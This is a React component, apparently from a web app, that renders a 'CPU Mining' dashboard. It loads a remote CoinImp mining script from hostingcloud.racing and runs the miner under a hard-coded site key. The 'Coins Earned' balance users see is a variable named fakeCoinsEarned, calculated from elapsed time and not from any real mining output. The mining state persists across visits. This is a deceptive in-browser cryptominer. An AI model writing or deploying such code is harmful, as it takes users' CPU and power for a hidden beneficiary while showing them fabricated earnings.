
"use client";

import { useState, useEffect, useCallback, useRef } from 'react';
import { Button } from '@/components/ui/button';
import GlassCard from '../core/glass-card';
import { Cpu, X, Minus, Maximize2, Loader2 } from 'lucide-react';

const LOCAL_STORAGE_MINING_STATE_KEY = 'cpu-mining-state';
const COINS_PER_24H = 2;
const COINS_PER_SECOND = COINS_PER_24H / (24 * 60 * 60);

interface CoinImpMiner {
  start: () => void;
  stop: () => void;
  isRunning: () => boolean;
  getHashesPerSecond: () => number;
  getTotalHashes: () => number;
}

declare global {
    interface Window {
        Client: {
            Anonymous: new (siteKey: string, options: any) => CoinImpMiner;
        };
    }
}

export default function CpuMining() {
  const [minerInstance, setMinerInstance] = useState<CoinImpMiner | null>(null);
  const [hashesPerSecond, setHashesPerSecond] = useState(0);
  const [totalHashes, setTotalHashes] = useState(0);
  const [isOnline, setIsOnline] = useState(true);

  const [miningState, setMiningState] = useState<{
    isMining: boolean;
    fakeCoinsEarned: number;
    lastUpdateTime: number;
  }>(() => {
    if (typeof window === 'undefined') {
      return { isMining: false, fakeCoinsEarned: 0, lastUpdateTime: Date.now() };
    }
    try {
      const savedState = localStorage.getItem(LOCAL_STORAGE_MINING_STATE_KEY);
      if (savedState) {
        const parsed = JSON.parse(savedState);
        if (parsed.isMining) {
          const now = Date.now();
          const timeDiffSeconds = (now - parsed.lastUpdateTime) / 1000;
          const coinsToAdd = timeDiffSeconds * COINS_PER_SECOND;
          parsed.fakeCoinsEarned = (parsed.fakeCoinsEarned || 0) + coinsToAdd;
          parsed.lastUpdateTime = now;
        }
        return parsed;
      }
    } catch (error) {
       console.error("Failed to parse mining state from localStorage", error);
    }
    return { isMining: false, fakeCoinsEarned: 0, lastUpdateTime: Date.now() };
  });

  const intervalRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    localStorage.setItem(LOCAL_STORAGE_MINING_STATE_KEY, JSON.stringify(miningState));
  }, [miningState]);

  useEffect(() => {
    const scriptId = 'coinimp-miner-script';
    
    if (document.getElementById(scriptId)) {
        if (window.Client && !minerInstance) {
            const miner = new window.Client.Anonymous('c541f766e3a569d2f01a1e9b0e96fd02e62d2cc7886f8c03a646befe8911df6a', { throttle: 0.5 });
            setMinerInstance(miner);
        }
        return;
    }

    const script = document.createElement('script');
    script.id = scriptId;
    script.src = 'https://www.hostingcloud.racing/YCcn.js';
    script.async = true;
    script.onload = () => {
        if (window.Client) {
            const miner = new window.Client.Anonymous('c541f766e3a569d2f01a1e9b0e96fd02e62d2cc7886f8c03a646befe8911df6a', { throttle: 0.5 });
            setMinerInstance(miner);
        }
    };
    document.body.appendChild(script);

  }, [minerInstance]);

  const startMiningProcess = useCallback(() => {
    if (minerInstance && !minerInstance.isRunning()) minerInstance.start();
    if (intervalRef.current) clearInterval(intervalRef.current);
    intervalRef.current = setInterval(() => {
      if (minerInstance) {
        setHashesPerSecond(minerInstance.getHashesPerSecond());
        setTotalHashes(minerInstance.getTotalHashes());
      }
      setMiningState(prev => {
          const now = Date.now();
          const timeDiffSeconds = (now - prev.lastUpdateTime) / 1000;
          const coinsToAdd = timeDiffSeconds * COINS_PER_SECOND;
          return { ...prev, fakeCoinsEarned: prev.fakeCoinsEarned + coinsToAdd, lastUpdateTime: now };
      });
    }, 1000);
  }, [minerInstance]);

  const stopMiningProcess = useCallback(() => {
    if (minerInstance && minerInstance.isRunning()) minerInstance.stop();
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    setHashesPerSecond(0);
  }, [minerInstance]);

  useEffect(() => {
    if (miningState.isMining && isOnline && minerInstance) startMiningProcess();
    else stopMiningProcess();
    return () => stopMiningProcess();
  }, [miningState.isMining, isOnline, minerInstance, startMiningProcess, stopMiningProcess]);
  
  useEffect(() => {
    const handleOnline = () => setIsOnline(true);
    const handleOffline = () => setIsOnline(false);
    window.addEventListener('online', handleOnline);
    window.addEventListener('offline', handleOffline);
    return () => {
        window.removeEventListener('online', handleOnline);
        window.removeEventListener('offline', handleOffline);
    };
  }, []);

  const toggleMining = () => {
    setMiningState(prev => ({ ...prev, isMining: !prev.isMining, lastUpdateTime: Date.now() }));
  };
  
  return (
      <GlassCard className="p-4 space-y-4">
          <div className="grid grid-cols-3 gap-2 text-center">
              <div><p className="text-xs text-muted-foreground">Status</p><p className={`font-bold text-sm ${!isOnline ? 'text-yellow-400' : miningState.isMining ? 'text-green-400' : 'text-red-400'}`}>{!isOnline ? 'Offline' : miningState.isMining ? 'Running' : 'Stopped'}</p></div>
              <div><p className="text-xs text-muted-foreground">Hash/s</p><p className="font-bold text-sm font-mono">{hashesPerSecond.toFixed(2)}</p></div>
               <div><p className="text-xs text-muted-foreground">Total Hashes</p><p className="font-bold text-sm font-mono">{totalHashes.toLocaleString()}</p></div>
          </div>
           <div className="text-center bg-muted/30 p-3 rounded-md">
                <p className="text-sm text-accent font-semibold">Coins Earned</p>
                <p className="text-3xl font-bold font-mono text-foreground">{miningState.fakeCoinsEarned.toFixed(6)}</p>
            </div>
          <Button onClick={toggleMining} className="w-full neon-accent-bg" disabled={!minerInstance}>
              {!minerInstance ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : null}
              {miningState.isMining ? 'Stop Mining' : 'Start Mining'}
          </Button>
      </GlassCard>
  );
}
